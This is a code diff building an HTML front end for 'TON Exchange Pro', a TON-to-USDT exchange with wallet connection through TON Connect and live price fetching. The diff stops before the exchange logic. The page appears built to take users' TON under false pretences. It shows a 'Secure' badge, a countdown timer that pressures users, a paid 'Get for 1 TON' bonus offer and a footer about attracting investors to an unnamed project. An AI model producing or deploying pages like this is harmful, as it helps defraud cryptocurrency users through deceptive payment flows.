@@ -4,55 +4,649 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Exchange Pro | Secure Crypto Exchange</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Возможно, вам нужно будет добавить здесь ссылки на TON Connect SDK -->
     <style>
-        /* Вставьте сюда ВЕСЬ ваш оригинальный CSS, который вы предоставили */
-        /* Он нужен для сохранения визуала. */
-
-        /* Добавьте эти стили для новых элементов */
-        .payment-section {
-            display: none; /* Сначала скрыто, пока кошелек не подключен */
+        :root {
+            --bg-primary: #0f0f23;
+            --bg-secondary: #1a1a2e;
+            --bg-tertiary: #252547;
+            --accent-primary: #6366f1;
+            --accent-secondary: #818cf8;
+            --text-primary: #f8fafc;
+            --text-secondary: #cbd5e1;
+            --text-muted: #64748b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --error: #ef4444;
+            --border: #334155;
+            --shadow: rgba(0, 0, 0, 0.5);
         }
 
-        .btn-primary {
-            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px 5px;
+        [data-theme="light"] {
+            --bg-primary: #f8fafc;
+            --bg-secondary: #ffffff;
+            --bg-tertiary: #f1f5f9;
+            --text-primary: #1e293b;
+            --text-secondary: #475569;
+            --text-muted: #64748b;
+            --border: #e2e8f0;
+            --shadow: rgba(0, 0, 0, 0.1);
         }
 
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px var(--shadow);
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        .btn-secondary {
-            background: var(--bg-tertiary);
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
             color: var(--text-primary);
-            border: 1px solid var(--border);
-            padding: 12px 30px;
-            border-radius: 10px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px 5px;
+            min-height: 100vh;
+            line-height: 1.6;
         }
 
-        .address-box {
-            background: var(--bg-primary);
+        .navbar {
+            background: var(--bg-secondary);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .nav-logo h2 {
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+        }
+
+        .nav-menu {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--accent-secondary);
+        }
+
+        .theme-toggle {
+            background: var(--bg-tertiary);
             border: 1px solid var(--border);
-            padding: 15px;
-            border-radius: 10px;
-            word-break: break-all;
-            font-family: monospace;
-            margin: 15px 0;
+            color: var(--text-primary);
+            padding: 0.5rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-left: 1rem;
+        }
+
+        .theme-toggle:hover {
+            background: var(--accent-primary);
+        }
+
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .hero-section {
             text-align: center;
+            margin-bottom: 3rem;
+            padding: 4rem 0;
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .exchange-container {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 2rem;
+            margin-bottom: 4rem;
+        }
+
+        @media (max-width: 968px) {
+            .exchange-container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .exchange-card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px var(--shadow);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .card-header h3 {
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--success);
+            color: white;
+            padding: 0.6rem 1.2rem;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+
+        .token-info {
+            margin-bottom: 24px;
+            padding: 16px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .token-info h3 {
+            margin-bottom: 12px;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .price-info {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 8px;
+            font-size: 0.85rem;
+        }
+
+        .exchange-rate {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .rate-change {
+            font-size: 0.8rem;
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .rate-up {
+            background: rgba(46, 125, 50, 0.2);
+            color: #8aff9b;
+        }
+
+        .rate-down {
+            background: rgba(211, 47, 47, 0.2);
+            color: #ff8a8a;
+        }
+
+        .exchange-widget {
+            margin: 24px 0;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-primary);
+            font-size: 1rem;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--accent-primary);
+        }
+
+        .conversion-arrow {
+            text-align: center;
+            margin: 12px 0;
+            color: var(--warning);
+            font-size: 1.2rem;
+        }
+
+        .discount-badge {
+            background: var(--success);
+            color: white;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            margin-left: 8px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 24px 0;
+        }
+
+        button {
+            padding: 14px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        #connect-btn {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        #exchange-btn {
+            background: var(--success);
+            color: white;
+            display: none;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        button:disabled {
+            background: var(--text-muted);
+            cursor: not-allowed;
+        }
+
+        .wallet-info, .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .status.success {
+            background: rgba(46, 125, 50, 0.15);
+            color: #8aff9b;
+            border: 1px solid rgba(46, 125, 50, 0.3);
+        }
+
+        .status.error {
+            background: rgba(211, 47, 47, 0.15);
+            color: #ff8a8a;
+            border: 1px solid rgba(211, 47, 47, 0.3);
+        }
+
+        .steps {
+            margin-top: 24px;
+        }
+
+        .steps h3 {
+            margin-bottom: 16px;
+            font-size: 1rem;
+            color: var(--warning);
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            font-size: 0.9rem;
+        }
+
+        .step-number {
+            background: var(--accent-primary);
+            color: white;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            font-size: 0.75rem;
+        }
+
+        .discount-active {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+            padding: 10px;
+            background: rgba(46, 125, 50, 0.15);
+            border-radius: 8px;
+            color: #8aff9b;
+            font-size: 0.85rem;
+            border: 1px solid rgba(46, 125, 50, 0.3);
+        }
+
+        .rate-info {
+            margin-top: 16px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.03);
+            font-size: 0.85rem;
+            text-align: center;
+        }
+
+        .info-card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            height: fit-content;
+            box-shadow: 0 20px 60px var(--shadow);
+        }
+
+        .info-card h4 {
+            margin-bottom: 2rem;
+            font-size: 1.6rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+        }
+
+        .info-item span:first-child {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .info-item span:last-child {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        .ton-features {
+            margin-top: 2.5rem;
+            padding-top: 2.5rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .ton-features h4 {
+            margin-bottom: 1.5rem;
+            font-size: 1.4rem;
+            font-weight: 600;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 0;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .feature-icon {
+            font-size: 1.5rem;
+        }
+
+        /* Promo sidebar styles */
+        .promo-header {
+            background: var(--accent-primary);
+            padding: 16px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .promo-header h2 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+        }
+
+        .promo-timer {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .timer-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--warning);
+            margin: 8px 0;
+        }
+
+        .promo-benefits {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 0.9rem;
+        }
+
+        .benefit-icon {
+            width: 24px;
+            height: 24px;
+            background: var(--warning);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            font-size: 0.8rem;
+        }
+
+        .get-promo-btn {
+            background: var(--accent-primary);
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .get-promo-btn:hover {
+            opacity: 0.9;
+        }
+
+        .get-promo-btn:disabled {
+            background: var(--text-muted);
+            cursor: not-allowed;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .footer {
+            background: var(--bg-secondary);
+            border-top: 1px solid var(--border);
+            margin-top: 5rem;
+            padding: 3rem 0 0;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem 2rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 3rem;
+        }
+
+        .footer-section h4 {
+            color: var(--text-primary);
+            margin-bottom: 1.5rem;
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section li {
+            margin-bottom: 0.8rem;
+        }
+
+        .footer-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            color: var(--accent-secondary);
+        }
+
+        .promotion-text {
+            color: var(--text-secondary);
+            line-height: 1.7;
+            font-weight: 500;
+        }
+
+        .promotion-highlight {
+            color: var(--accent-secondary);
+            font-weight: 600;
+            margin-top: 1.5rem;
+            padding: 1.5rem;
+            background: var(--bg-primary);
+            border-radius: 12px;
+            border-left: 4px solid var(--accent-primary);
+        }
+
+        .footer-bottom {
+            border-top: 1px solid var(--border);
+            padding: 2rem;
+            margin-top: 2rem;
+        }
+
+        .footer-bottom-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+        }
+
+        .footer-bottom-content p {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1.5rem;
+        }
+
+        .social-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+            font-weight: 500;
+        }
+
+        .social-link:hover {
+            color: var(--accent-secondary);
+        }
+
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .nav-menu {
+                flex-direction: column;
+                gap: 1rem;
+                width: 100%;
+            }
+            
+            .footer-bottom-content {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+
+        .ton-connect-btn {
+            display: none !important;
+        }
+
+        #connect-btn-container {
+            display: none;
         }
     </style>
 </head>
@@ -66,8 +660,6 @@
                 <a href="#" class="nav-link">Exchange</a>
                 <a href="#" class="nav-link">Rates</a>
                 <a href="#" class="nav-link">FAQ</a>
-                <!-- Кнопка для подключения кошелька -->
-                <button class="btn-secondary" id="connectWalletBtn">Connect Wallet</button>
                 <button class="theme-toggle" id="themeToggle">
                     <span class="theme-icon">🌙</span>
                 </button>
@@ -86,41 +678,89 @@
         <div class="exchange-container">
             <div class="exchange-card">
                 <div class="card-header">
-                    <h3>Our Service</h3>
+                    <h3>TON to USDT Exchange</h3>
                     <div class="security-badge">
                         <span class="secure-icon">🔒</span>
                         <span>Secure</span>
                     </div>
                 </div>
 
-                <!-- Секция подключения кошелька -->
-                <div id="walletConnectSection">
-                    <p>🔗 <strong>Connect your TON wallet to start exchanging.</strong></p>
-                    <button class="btn-primary" id="connectBtn">Connect Wallet</button>
-                    <div id="walletInfo" style="display: none;">
-                        <p>Connected: <span id="walletAddress"></span></p>
+                <div class="token-info">
+                    <h3>Token: <span id="token-name">Tether USDT</span> (<span id="token-symbol">USD₮</span>)</h3>
+                    <div class="price-info">
+                        <div class="exchange-rate">
+                            <span>Current TON rate:</span>
+                            <span id="ton-price">2.5348 USDT</span>
+                        </div>
+                        <div class="exchange-rate">
+                            <span>1 TON =</span>
+                            <span id="tokens-per-ton">2.5348 USDT</span>
+                        </div>
+                        <div class="exchange-rate">
+                            <span>24h change:</span>
+                            <span id="price-change-24h" class="rate-change">+0.00%</span>
+                        </div>
+                        <div class="exchange-rate">
+                            <span>Last hour change:</span>
+                            <span id="price-change-1h" class="rate-change">+0.00%</span>
+                        </div>
                     </div>
                 </div>
 
-                <!-- Секция оплаты (изначально скрыта) -->
-                <div class="payment-section" id="paymentSection">
-                    <h4>Make a Payment</h4>
-                    <p>Special Offer: <strong>1 TON discount</strong> on your first exchange!</p>
-                    <div class="address-box" id="paymentAddress">
-                        Payment Address Will Appear Here
+                <div class="exchange-widget">
+                    <div class="input-group">
+                        <label for="ton-amount">Enter TON amount:</label>
+                        <input type="number" id="ton-amount" class="input-field" placeholder="0.0" min="0" step="0.0001" value="1">
                     </div>
-                    <p>Amount: <span id="paymentAmount">0</span> TON</p>
-                    <button class="btn-primary" id="checkPaymentBtn">Check Payment Status</button>
-                    <div id="paymentStatus"></div>
+
+                    <div class="conversion-arrow">↓</div>
+
+                    <div class="input-group">
+                        <label for="token-amount">You will receive USDT: <span id="discount-badge" class="discount-badge hidden">+2.5%</span></label>
+                        <input type="text" id="token-amount" class="input-field" readonly value="2.5348">
+                    </div>
                 </div>
 
-                <!-- Система обмена и отслеживания цен -->
-                <div class="ton-connect-info">
-                    <p>⚡ <strong>Real-time Exchange System:</strong> We are building a secure and reliable cryptocurrency exchange platform with live price tracking.</p>
-                    <!-- Сюда можно встроить графики или данные об обменном курсе -->
-                    <div id="priceTicker">
-                        <p>TON/USD: <span id="tonPrice">Loading...</span></p>
+                <div id="discount-active" class="discount-active hidden">
+                    <span style="margin-left: 10px;">Special 2.5% discount active! Time left: <span id="discount-timer">05:00</span></span>
+                </div>
+
+                <div class="button-group">
+                    <button id="connect-btn">
+                        Connect Wallet
+                    </button>
+
+                    <button id="exchange-btn" disabled>
+                        Exchange
+                    </button>
+                </div>
+
+                <div id="wallet-info" class="wallet-info"></div>
+
+                <div id="status" class="status"></div>
+
+                <div class="steps">
+                    <h3>How it works:</h3>
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-text">Connect your TON wallet</div>
                     </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-text">Enter the amount of TON you want to exchange</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-text">Confirm the transaction in your wallet</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <div class="step-text">Receive USDT in your wallet</div>
+                    </div>
+                </div>
+
+                <div class="rate-info">
+                    <p>Network fee: 0.05 TON | Rate updates automatically</p>
                 </div>
             </div>
 
@@ -143,10 +783,43 @@
                         <span>Service fee:</span>
                         <span>0%</span>
                     </div>
-                    <div class="info-item">
-                        <span>Special Offer:</span>
-                        <span style="color: var(--success);">1 TON Discount</span>
+                </div>
+                
+                <div class="promo-section">
+                    <div class="promo-header">
+                        <h2>Exclusive Offer</h2>
+                        <p>Get +2.5% on exchange!</p>
                     </div>
+
+                    <div class="promo-timer">
+                        <h3>Promotion active for:</h3>
+                        <div class="timer-value" id="promo-timer">05:00</div>
+                        <p>after activation</p>
+                    </div>
+
+                    <div class="promo-benefits">
+                        <h3>Promotion benefits:</h3>
+                        <div class="benefit-item">
+                            <div class="benefit-icon">+</div>
+                            <div>Additional 2.5% USDT when exchanging</div>
+                        </div>
+                        <div class="benefit-item">
+                            <div class="benefit-icon">⚡</div>
+                            <div>Instant activation</div>
+                        </div>
+                        <div class="benefit-item">
+                            <div class="benefit-icon">🕒</div>
+                            <div>Valid for 5 minutes after payment</div>
+                        </div>
+                        <div class="benefit-item">
+                            <div class="benefit-icon">💎</div>
+                            <div>Exclusive offer</div>
+                        </div>
+                    </div>
+
+                    <button class="get-promo-btn" id="get-promo-btn">
+                        Get for 1 TON
+                    </button>
                 </div>
                 
                 <div class="ton-features">
@@ -169,84 +842,554 @@
     </main>
 
     <footer class="footer">
-        <!-- Ваш оригинальный футер -->
+        <div class="footer-container">
+            <div class="footer-section">
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="#" class="footer-link">Help Center</a></li>
+                    <li><a href="#" class="footer-link">Contact Us</a></li>
+                    <li><a href="#" class="footer-link">Status</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>About Us</h4>
+                <ul>
+                    <li><a href="#" class="footer-link">Our Company</a></li>
+                    <li><a href="#" class="footer-link">Careers</a></li>
+                    <li><a href="#" class="footer-link">Press</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#" class="footer-link">Privacy Policy</a></li>
+                    <li><a href="#" class="footer-link">Terms of Service</a></li>
+                    <li><a href="#" class="footer-link">AML Policy</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Special Promotion</h4>
+                <div class="promotion-text">
+                    <p>We are running this service to attract initial investors to our upcoming crypto project. Stay tuned for the official announcement of our groundbreaking blockchain initiative!</p>
+                    <p class="promotion-highlight">Join us in building the future of decentralized finance.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <div class="footer-bottom-content">
+                <p>&copy; 2024 TON Exchange Pro. All rights reserved. Secure crypto exchange platform.</p>
+                <div class="social-links">
+                    <a href="#" class="social-link">Twitter</a>
+                    <a href="#" class="social-link">Telegram</a>
+                    <a href="#" class="social-link">GitHub</a>
+                </div>
+            </div>
+        </div>
     </footer>
 
+    <div id="connect-btn-container"></div>
+
     <script>
-        // ==================================================
-        // ТОЛЬКО ПРИМЕР ЛОГИКИ - ЗАМЕНИТЕ НА РЕАЛЬНЫЙ КОД ИЗ SWAPTON
-        // ==================================================
+        // Configuration
+        const TOKEN_CONFIG = {
+            name: "Tether USDT",
+            symbol: "USD₮",
+            masterAddress: "EQArTC3-SX8PACBjyYXfpOONA_TE0_1fWScSU9LuMe_nJxTx",
+            decimals: 9
+        };
 
-        // Ваш существующий код для переключения темы
+        // Initial TON to USDT rate
+        let tonPriceInUSDT = 2.5348;
+        let previousPrice = tonPriceInUSDT;
+        let priceHistory = [];
+
+        // Variables for promotional offer
+        let discountActive = false;
+        let discountEndTime = 0;
+        let discountTimerInterval = null;
+
+        // DOM elements
+        const connectBtn = document.getElementById('connect-btn');
+        const exchangeBtn = document.getElementById('exchange-btn');
+        const walletInfo = document.getElementById('wallet-info');
+        const statusEl = document.getElementById('status');
+        const tonAmountInput = document.getElementById('ton-amount');
+        const tokenAmountInput = document.getElementById('token-amount');
+        const tokenNameEl = document.getElementById('token-name');
+        const tokenSymbolEl = document.getElementById('token-symbol');
+        const tonPriceEl = document.getElementById('ton-price');
+        const tokensPerTonEl = document.getElementById('tokens-per-ton');
+        const discountBadge = document.getElementById('discount-badge');
+        const discountActiveEl = document.getElementById('discount-active');
+        const discountTimerEl = document.getElementById('discount-timer');
+        const getPromoBtn = document.getElementById('get-promo-btn');
+        const promoTimerEl = document.getElementById('promo-timer');
+        const priceChange24hEl = document.getElementById('price-change-24h');
+        const priceChange1hEl = document.getElementById('price-change-1h');
         const themeToggle = document.getElementById('themeToggle');
-        // ... (ваш код темы остается без изменений)
 
-        // ===== НОВЫЙ КОД ДЛЯ ИНТЕГРАЦИИ SWAPTON =====
+        // Update token information
+        tokenNameEl.textContent = TOKEN_CONFIG.name;
+        tokenSymbolEl.textContent = TOKEN_CONFIG.symbol;
+        updatePriceDisplay();
 
-        // Элементы интерфейса
-        const connectBtn = document.getElementById('connectBtn');
-        const walletInfo = document.getElementById('walletInfo');
-        const walletAddress = document.getElementById('walletAddress');
-        const paymentSection = document.getElementById('paymentSection');
-        const paymentAddress = document.getElementById('paymentAddress');
-        const checkPaymentBtn = document.getElementById('checkPaymentBtn');
-        const paymentStatus = document.getElementById('paymentStatus');
+        // Check for active discount on page load
+        checkDiscountStatus();
 
-        // Подключение кошелька (ЗАГЛУШКА - замените на реальный код из SwapTon)
-        connectBtn.addEventListener('click', async () => {
-            try {
-                // ЗДЕСЬ ДОЛЖНА БЫТЬ РЕАЛЬНАЯ ЛОГИКА ПОДКЛЮЧЕНИЯ TON CONNECT
-                // Это пример - замените на вызовы из проекта SwapTon
-                console.log("Attempting to connect wallet...");
+        // Calculate token amount when TON changes
+        tonAmountInput.addEventListener('input', calculateTokens);
 
-                // Имитация успешного подключения
-                const mockAddress = "EQABC123...xyz"; // Заглушка адреса
-                
-                walletAddress.textContent = mockAddress;
-                walletInfo.style.display = 'block';
-                paymentSection.style.display = 'block';
-                connectBtn.textContent = 'Connected';
+        function calculateTokens() {
+            const tonAmount = parseFloat(tonAmountInput.value) || 0;
+            let tokenAmount = tonAmount * tonPriceInUSDT;
 
-                // Генерация платежного адреса (ЗАГЛУШКА)
-                paymentAddress.textContent = "UQB7b... (Payment Address from SwapTon)";
-                
-            } catch (error) {
-                console.error("Connection failed:", error);
-                alert("Failed to connect wallet. Please try again.");
+            // Apply discount if active
+            if (discountActive) {
+                tokenAmount *= 1.025; // +2.5%
             }
-        });
 
-        // Проверка статуса платежа (ЗАГЛУШКА - замените на реальный код из SwapTon)
-        checkPaymentBtn.addEventListener('click', async () => {
-            try {
-                // ЗДЕСЬ ДОЛЖНА БЫТЬ РЕАЛЬНАЯ ЛОГИКА ПРОВЕРКИ ТРАНЗАКЦИИ
-                console.log("Checking payment status...");
+            tokenAmountInput.value = tokenAmount.toFixed(4);
 
-                // Имитация проверки
-                paymentStatus.innerHTML = '<p style="color: var(--success);">✅ Payment confirmed! Processing your exchange...</p>';
-                
-            } catch (error) {
-                console.error("Payment check failed:", error);
-                paymentStatus.innerHTML = '<p style="color: var(--error);">❌ Payment not found. Please try again.</p>';
-            }
-        });
-
-        // Система отслеживания цены TON (ЗАГЛУШКА)
-        async function updateTonPrice() {
-            try {
-                // ЗДЕСЬ МОЖЕТ БЫТЬ ИНТЕГРАЦИЯ С API ДЛЯ ПОЛУЧЕНИЯ ЦЕНЫ
-                const tonPriceElement = document.getElementById('tonPrice');
-                // Заглушка - реальная цена должна приходить с API
-                tonPriceElement.textContent = "$5.42"; 
-            } catch (error) {
-                console.error("Failed to fetch TON price:", error);
+            // Enable exchange button if valid amount is entered
+            if (exchangeBtn.style.display !== 'none') {
+                exchangeBtn.disabled = tonAmount <= 0;
             }
         }
 
-        // Обновляем цену при загрузке и каждые 30 секунд
-        updateTonPrice();
-        setInterval(updateTonPrice, 30000);
+        // Function to get current TON/USDT rate
+        async function fetchTonPrice() {
+            try {
+                // Try to get rate from Binance API
+                const response = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=TONUSDT');
+                const data = await response.json();
 
+                if (data && data.lastPrice) {
+                    const newPrice = parseFloat(data.lastPrice);
+                    const priceChangePercent = parseFloat(data.priceChangePercent);
+                    const priceChange24h = parseFloat(data.priceChange);
+
+                    // Update price change display
+                    updatePriceChangeDisplay(priceChangePercent, priceChange24h);
+
+                    // Update rate
+                    previousPrice = tonPriceInUSDT;
+                    tonPriceInUSDT = newPrice;
+
+                    // Save price history for change calculations
+                    const timestamp = Date.now();
+                    priceHistory.push({ price: newPrice, timestamp });
+
+                    // Remove old entries (older than 24 hours)
+                    const oneDayAgo = timestamp - 24 * 60 * 60 * 1000;
+                    priceHistory = priceHistory.filter(item => item.timestamp > oneDayAgo);
+
+                    // Update display
+                    updatePriceDisplay();
+
+                    return true;
+                }
+            } catch (error) {
+                console.error('Error getting rate from Binance:', error);
+            }
+
+            try {
+                // Fallback: try to get rate from CoinGecko API
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd&include_24hr_change=true');
+                const data = await response.json();
+
+                if (data && data['the-open-network'] && data['the-open-network'].usd) {
+                    const newPrice = data['the-open-network'].usd;
+                    const priceChangePercent = data['the-open-network'].usd_24h_change;
+
+                    // Update price change display
+                    updatePriceChangeDisplay(priceChangePercent, 0);
+
+                    // Update rate
+                    previousPrice = tonPriceInUSDT;
+                    tonPriceInUSDT = newPrice;
+
+                    // Update display
+                    updatePriceDisplay();
+
+                    return true;
+                }
+            } catch (error) {
+                console.error('Error getting rate from CoinGecko:', error);
+            }
+
+            return false;
+        }
+
+        // Update price change display
+        function updatePriceChangeDisplay(changePercent24h, change24h) {
+            // Update 24h change
+            if (changePercent24h !== undefined) {
+                const changeFormatted = changePercent24h.toFixed(2);
+
+                if (changePercent24h > 0) {
+                    priceChange24hEl.textContent = `+${changeFormatted}%`;
+                    priceChange24hEl.className = 'rate-change rate-up';
+                } else if (changePercent24h < 0) {
+                    priceChange24hEl.textContent = `${changeFormatted}%`;
+                    priceChange24hEl.className = 'rate-change rate-down';
+                } else {
+                    priceChange24hEl.textContent = '0.00%';
+                    priceChange24hEl.className = 'rate-change';
+                }
+            }
+
+            // Calculate last hour change
+            if (priceHistory.length > 1) {
+                const oneHourAgo = Date.now() - 60 * 60 * 1000;
+                const recentPrices = priceHistory.filter(item => item.timestamp > oneHourAgo);
+
+                if (recentPrices.length > 1) {
+                    const oldestPrice = recentPrices[0].price;
+                    const newestPrice = recentPrices[recentPrices.length - 1].price;
+                    const changePercent1h = ((newestPrice - oldestPrice) / oldestPrice) * 100;
+                    const changeFormatted1h = changePercent1h.toFixed(2);
+
+                    if (changePercent1h > 0) {
+                        priceChange1hEl.textContent = `+${changeFormatted1h}%`;
+                        priceChange1hEl.className = 'rate-change rate-up';
+                    } else if (changePercent1h < 0) {
+                        priceChange1hEl.textContent = `${changeFormatted1h}%`;
+                        priceChange1hEl.className = 'rate-change rate-down';
+                    } else {
+                        priceChange1hEl.textContent = '0.00%';
+                        priceChange1hEl.className = 'rate-change';
+                    }
+                }
+            }
+        }
+
+        // Update price display
+        function updatePriceDisplay() {
+            tonPriceEl.textContent = tonPriceInUSDT.toFixed(4) + ' USDT';
+            tokensPerTonEl.textContent = tonPriceInUSDT.toFixed(4) + ' USDT';
+            calculateTokens();
+        }
+
+        // Initialize TonConnect
+        let tonConnectUI = null;
+
+        async function initTonConnect() {
+            try {
+                // Check if library is loaded
+                if (typeof TON_CONNECT_UI === 'undefined') {
+                    showStatus('TON Connect library failed to load. Check your internet connection.', 'error');
+                    return;
+                }
+
+                // Use your manifest URL - replace with your actual manifest URL
+                const manifestUrl = 'https://yourdomain.com/tonconnect-manifest.json';
+
+                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                    manifestUrl: manifestUrl
+                });
+
+                // Subscribe to status changes
+                tonConnectUI.onStatusChange(async (wallet) => {
+                    if (wallet) {
+                        await walletConnected(wallet);
+                    } else {
